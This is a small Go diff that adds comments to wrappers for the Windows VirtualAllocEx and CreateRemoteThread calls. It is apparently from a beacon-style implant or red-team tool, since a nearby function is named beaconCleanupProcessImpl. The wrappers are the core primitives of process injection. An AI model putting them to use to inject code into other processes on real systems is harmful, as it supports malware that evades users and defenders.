@@ -248,6 +248,8 @@ func beaconCleanupProcessImpl(piPtr uintptr) uintptr {
 
 // remoteVirtualAlloc wraps kernel32!VirtualAllocEx via the shared proc
 // handle. Returns the remote base address (0 on failure).
+// Uses api.Proc*.Call because golang.org/x/sys/windows doesn't expose
+// VirtualAllocEx on the cross-process variant.
 func remoteVirtualAlloc(hProc windows.Handle, size, protect uint32) uintptr {
 	r, _, _ := api.ProcVirtualAllocEx.Call(
 		uintptr(hProc), 0, uintptr(size),
@@ -258,6 +260,7 @@ func remoteVirtualAlloc(hProc windows.Handle, size, protect uint32) uintptr {
 
 // remoteCreateThread wraps kernel32!CreateRemoteThread via the shared
 // proc handle. Returns the thread handle (0 on failure).
+// CreateRemoteThread is not exposed by golang.org/x/sys/windows either.
 func remoteCreateThread(hProc windows.Handle, entry, param uintptr) uintptr {
 	r, _, _ := api.ProcCreateRemoteThread.Call(
 		uintptr(hProc), 0, 0, entry, param, 0, 0,
